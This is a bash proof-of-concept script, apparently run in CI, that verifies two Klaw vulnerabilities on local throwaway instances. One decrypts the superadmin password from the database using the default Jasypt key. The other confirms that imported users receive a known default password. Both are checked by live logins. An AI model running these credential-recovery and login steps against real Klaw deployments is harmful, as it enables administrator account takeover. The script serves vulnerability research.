#!/usr/bin/env bash
# Klaw PoC — runs on a GitHub Actions ubuntu-latest runner.
# Local test instances only (throwaway H2 DBs, throwaway test passwords).
# Nothing is submitted to Bugcrowd, disclosed, or contacted.
#
# Candidate 1: the default Jasypt key (kw2021secretkey, public in the repo)
#   encrypts legacy passwords incl. superadmin; anyone holding a `pwd`
#   ciphertext can decrypt it offline.
# Candidate 2: a metadata import into a FRESH instance assigns the publicly
#   known default password WelcomeToKlaw!! to every imported user (incl. the
#   superadmin-role account), with no forced change.
#
# Honest verdicts only: a candidate is CONFIRMED only when a live HTTP login
# succeeds with the recovered / known password. All output goes to stdout
# (the workflow log) and is tee'd to poc-work/poc-results.log.
#
# Assumes: cwd = muse-studio checkout; klaw/ checkout at 574ceed present;
# klaw/core/target/klaw-*.jar built; poc-work/tools has h2 + jasypt jars
# and a compiled JasyptPoc.class.
set -u

ROOT="$PWD"
WORK="$ROOT/poc-work"
LOG="$WORK/poc-results.log"
SUMMARY="$WORK/poc-summary.md"
TOOLS="$WORK/tools"
BASE="http://localhost:9097"
JAR="$(ls "$ROOT"/klaw/core/target/klaw-*.jar 2>/dev/null | head -1)"
SECRET="$(openssl rand -base64 32)"

mkdir -p "$WORK"
exec > >(tee -a "$LOG") 2>&1

PASS=0
FAIL=0
C1_FAIL=0
C2_FAIL=0

note() { echo "[$(date -u +%H:%M:%S)] $*"; }

# check <group: C1|C2|SETUP> <name> <expected> <actual>
check() {
  local group="$1" name="$2" expected="$3" actual="$4"
  if [ "$expected" = "$actual" ]; then
    echo "CHECK PASS [$group]: $name (got '$actual')"
    PASS=$((PASS + 1))
  else
    echo "CHECK FAIL [$group]: $name (expected '$expected', got '$actual')"
    FAIL=$((FAIL + 1))
    [ "$group" = "C1" ] && C1_FAIL=$((C1_FAIL + 1))
    [ "$group" = "C2" ] && C2_FAIL=$((C2_FAIL + 1))
  fi
}

wait_healthy() { # wait_healthy <timeout_s>
  local t=0
  while [ "$t" -lt "$1" ]; do
    if curl -fs -o /dev/null "$BASE/login" 2>/dev/null; then
      note "Klaw healthy after ${t}s"
      return 0
    fi
    sleep 5
    t=$((t + 5))
  done
  note "Klaw NOT healthy after ${1}s"
  return 1
}

# login <user> <password> — sets LOGIN_CODE (HTTP code of GET /getAuth)
# and LOGIN_BODY (raw /getAuth response). 200 = authenticated.
LOGIN_CODE=""
LOGIN_BODY=""
login() {
  local user="$1" pass="$2" jar="$WORK/cookies.txt"
  rm -f "$jar"
  curl -s -c "$jar" "$BASE/login" -o /dev/null
  local xsrf=""
  if [ -f "$jar" ]; then
    xsrf="$(awk '$6=="XSRF-TOKEN" {print $7}' "$jar" | tail -1)"
  fi
  if [ -n "$xsrf" ]; then
    curl -s -b "$jar" -c "$jar" -o /dev/null \
      --data-urlencode "username=$user" \
      --data-urlencode "password=$pass" \
      --data-urlencode "_csrf=$xsrf" \
      "$BASE/login"
  else
    curl -s -b "$jar" -c "$jar" -o /dev/null \
      --data-urlencode "username=$user" \
      --data-urlencode "password=$pass" \
      "$BASE/login"
  fi
  LOGIN_BODY="$(curl -s -b "$jar" "$BASE/getAuth")"
  LOGIN_CODE="$(curl -s -b "$jar" -o /dev/null -w "%{http_code}" "$BASE/getAuth")"
  note "login($user): /getAuth HTTP $LOGIN_CODE body: $(echo "$LOGIN_BODY" | head -c 300)"
}

start_klaw() { # start_klaw <dir> <logfile> <env assignments...>
  local dir="$1" log="$2"
  shift 2
  mkdir -p "$dir"
  ( cd "$dir" && env "$@" nohup java -jar "$JAR" > "$log" 2>&1 & echo $! > "$dir/klaw.pid" )
  sleep 2
  note "started Klaw in $dir (pid $(cat "$dir/klaw.pid" 2>/dev/null || echo '?'))"
}

stop_klaw() { # stop_klaw <dir>
  local pid=""
  pid="$(cat "$1/klaw.pid" 2>/dev/null || echo "")"
  if [ -n "$pid" ]; then
    kill "$pid" 2>/dev/null || true
    local i=0
    while kill -0 "$pid" 2>/dev/null && [ "$i" -lt 30 ]; do sleep 2; i=$((i + 1)); done
    kill -9 "$pid" 2>/dev/null || true
    note "stopped Klaw in $1"
  fi
}

h2_sql() { # h2_sql <dir> <sql>
  ( cd "$1" && java -cp "$TOOLS/h2-2.1.214.jar" org.h2.tools.Shell \
      -url "jdbc:h2:file:./klawprodb;DB_CLOSE_ON_EXIT=FALSE;DB_CLOSE_DELAY=-1;MODE=MySQL;CASE_INSENSITIVE_IDENTIFIERS=TRUE;" \
      -user kafkauser -password <redacted> -sql "$2" )
}

trap 'stop_klaw "$WORK/instance-a" 2>/dev/null; stop_klaw "$WORK/instance-b" 2>/dev/null' EXIT

note "=== PoC start: Klaw jar = $JAR ==="
[ -n "$JAR" ] || { note "FATAL: no klaw jar found"; exit 1; }

# ---------------------------------------------------------------- instance A
note "=== INSTANCE A (default config, quickstart on, export scheduler on) ==="
start_klaw "$WORK/instance-a" "$WORK/instance-a.log" \
  KLAW_SUPERADMIN_DEFAULT_PASSWORD=SuperSecret123 \
  KLAW_CLUSTERAPI_ACCESS_BASE64_SECRET="$SECRET" \
  KLAW_QUICKSTART_ENABLED=true \
  KLAW_EXPORT_SCHEDULER_ENABLE=true \
  KLAW_EXPORT_CRON_EXPRESSION="0/30 * * * * ?" \
  KLAW_EXPORT_FILE_PATH="$WORK/export-a"

if ! wait_healthy 240; then
  note "FATAL: instance A did not start"
  tail -60 "$WORK/instance-a.log"
  exit 1
fi

login superadmin SuperSecret123
check SETUP "sanity login superadmin/SuperSecret123 on A" "200" "$LOGIN_CODE"

# wait for the scheduled export file (needed for candidate 2)
EXPORT_FILE=""
for _ in $(seq 1 36); do
  EXPORT_FILE="$(ls "$WORK"/export-a/kwmetadata-admin_config-*.json 2>/dev/null | head -1)"
  [ -n "$EXPORT_FILE" ] && break
  sleep 5
done
note "export file: ${EXPORT_FILE:-NONE after 180s}"
[ -n "$EXPORT_FILE" ] || { note "FATAL: no export file appeared"; tail -40 "$WORK/instance-a.log"; exit 1; }
ls -la "$WORK/export-a/"
python3 - "$EXPORT_FILE" <<'PYEOF'
import json, sys
def find_users(o):
    if isinstance(o, dict):
        if "users" in o and isinstance(o["users"], list):
            return o["users"]
        for v in o.values():
            r = find_users(v)
            if r is not None:
                return r
    if isinstance(o, list):
        for v in o:
            r = find_users(v)
            if r is not None:
                return r
    return None
d = json.load(open(sys.argv[1]))
users = find_users(d) or []
print("EXPORT USERS: %d" % len(users))
pwds = set()
for u in users:
    print("EXPORT USER: %s pwd=%s" % (u.get("username"), (u.get("pwd") or "")[:16] + "..."))
    pwds.add(u.get("pwd"))
print("EXPORT DISTINCT PWD VALUES: %d (expect 1)" % len(pwds))
PYEOF

# ---------------------------------------------------------- candidate 1: read
note "=== CANDIDATE 1: read superadmin pwd from H2, decrypt offline ==="
stop_klaw "$WORK/instance-a"
sleep 5
H2_OUT="$(h2_sql "$WORK/instance-a" "SELECT pwd FROM kwusers WHERE userid='superadmin';")"
note "H2 output: $H2_OUT"
CIPHERTEXT="$(echo "$H2_OUT" | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$' | head -1)"
note "superadmin ciphertext: ${CIPHERTEXT:-NONE FOUND}"
[ -n "$CIPHERTEXT" ] || { note "FATAL: could not read superadmin pwd from H2"; exit 1; }

DECRYPT_JAVA="$(java -cp "$TOOLS/jasypt-1.9.3.jar:$TOOLS/slf4j-api-1.7.36.jar:$TOOLS" JasyptPoc "$CIPHERTEXT" 2>/dev/null | grep "DECRYPT" | sed 's/.*= //')"
DECRYPT_PY="$(python3 "$ROOT/klaw-poc/jasypt_independent.py" decrypt "$CIPHERTEXT" 2>/dev/null)"
note "decrypted with real Jasypt 1.9.3: $DECRYPT_JAVA"
note "decrypted with independent Python impl: $DECRYPT_PY"
check C1 "decrypt (real Jasypt) == SuperSecret123" "SuperSecret123" "$DECRYPT_JAVA"
check C1 "decrypt (independent Python) == SuperSecret123" "SuperSecret123" "$DECRYPT_PY"

# live login with the recovered password
start_klaw "$WORK/instance-a" "$WORK/instance-a.log" \
  KLAW_SUPERADMIN_DEFAULT_PASSWORD=SuperSecret123 \
  KLAW_CLUSTERAPI_ACCESS_BASE64_SECRET="$SECRET" \
  KLAW_QUICKSTART_ENABLED=true \
  KLAW_EXPORT_SCHEDULER_ENABLE=true \
  KLAW_EXPORT_CRON_EXPRESSION="0/30 * * * * ?" \
  KLAW_EXPORT_FILE_PATH="$WORK/export-a"
wait_healthy 240 || { note "FATAL: instance A did not restart"; exit 1; }
login superadmin "$DECRYPT_JAVA"
check C1 "live login superadmin/<recovered password> on A" "200" "$LOGIN_CODE"
login superadmin "WrongPassword123"
check C1 "negative control: superadmin/WrongPassword123 rejected" "302" "$LOGIN_CODE"
stop_klaw "$WORK/instance-a"

# ---------------------------------------------------------- candidate 2: import
note "=== CANDIDATE 2: import A's export into FRESH instance B ==="
start_klaw "$WORK/instance-b" "$WORK/instance-b.log" \
  KLAW_SUPERADMIN_DEFAULT_USERNAME=admin2 \
  KLAW_SUPERADMIN_DEFAULT_PASSWORD=BAdminPass123 \
  KLAW_CLUSTERAPI_ACCESS_BASE64_SECRET="$SECRET" \
  KLAW_IMPORT_ENABLE=true \
  KLAW_IMPORT_ADMINCONFIG_ENABLE=true \
  KLAW_IMPORT_ADMINCONFIG_FILE_PATH="$EXPORT_FILE"
if ! wait_healthy 240; then
  note "FATAL: instance B did not start"
  tail -60 "$WORK/instance-b.log"
  exit 1
fi
if grep -q "Klaw Admin config metadata imported" "$WORK/instance-b.log"; then
  echo "CHECK PASS [C2]: import ran (log shows 'Klaw Admin config metadata imported')"
  PASS=$((PASS + 1))
else
  echo "CHECK FAIL [C2]: import message not found in instance B log"
  FAIL=$((FAIL + 1)); C2_FAIL=$((C2_FAIL + 1))
  tail -40 "$WORK/instance-b.log"
fi

login superadmin "WelcomeToKlaw!!"
check C2 "live login superadmin/WelcomeToKlaw!! on B (imported superadmin)" "200" "$LOGIN_CODE"
login superadmin "SuperSecret123"
check C2 "negative control: superadmin/SuperSecret123 (old pwd) rejected on B" "302" "$LOGIN_CODE"
login william "WelcomeToKlaw!!"
check C2 "live login william/WelcomeToKlaw!! on B (imported user)" "200" "$LOGIN_CODE"
login william "welcome"
check C2 "negative control: william/welcome (old pwd) rejected on B" "302" "$LOGIN_CODE"
login admin2 "BAdminPass123"
check C2 "control: admin2/BAdminPass123 (B's own seeded admin) still works" "200" "$LOGIN_CODE"
stop_klaw "$WORK/instance-b"

# ------------------------------------------------------------------- summary
{
  echo "# Klaw PoC results (GitHub Actions, run $GITHUB_RUN_ID, $(date -u +%Y-%m-%dT%H:%M:%SZ))"
  echo ""
  echo "Target: Aiven-Open/klaw @ 574ceed2aa5a3d45a5cf000c71088cb42c362b93."
  echo "Test instances only (throwaway H2 DBs, throwaway passwords). Nothing"
  echo "submitted to Bugcrowd, nothing disclosed, nobody contacted."
  echo ""
  if [ "$C1_FAIL" -eq 0 ]; then
    echo "## CANDIDATE 1 — CONFIRMED"
  else
    echo "## CANDIDATE 1 — NOT CONFIRMED ($C1_FAIL check(s) failed)"
  fi
  echo "Default Jasypt key kw2021secretkey decrypts the superadmin pwd read"
  echo "from the live instance's DB; live login with the recovered password"
  echo "succeeded. Ciphertext: ${CIPHERTEXT:-n/a}; recovered: ${DECRYPT_JAVA:-n/a}."
  echo ""
  if [ "$C2_FAIL" -eq 0 ]; then
    echo "## CANDIDATE 2 — CONFIRMED"
  else
    echo "## CANDIDATE 2 — NOT CONFIRMED ($C2_FAIL check(s) failed)"
  fi
  echo "Import of A's exported admin_config into fresh instance B assigned"
  echo "WelcomeToKlaw!! to every imported user incl. the superadmin-role"
  echo "account; live logins with it succeeded, old passwords rejected."
  echo "Precision: a same-username account pre-seeded on B is NOT overwritten"
  echo "(insertIntoUsers refuses duplicates) — B used a different seeded admin"
  echo "(admin2) so the imported superadmin was a new user."
  echo ""
  echo "Checks passed: $PASS, failed: $FAIL. Full log: poc-results.log."
} > "$SUMMARY"
cat "$SUMMARY"

note "=== PoC done: PASS=$PASS FAIL=$FAIL C1_FAIL=$C1_FAIL C2_FAIL=$C2_FAIL ==="
[ "$FAIL" -eq 0 ]
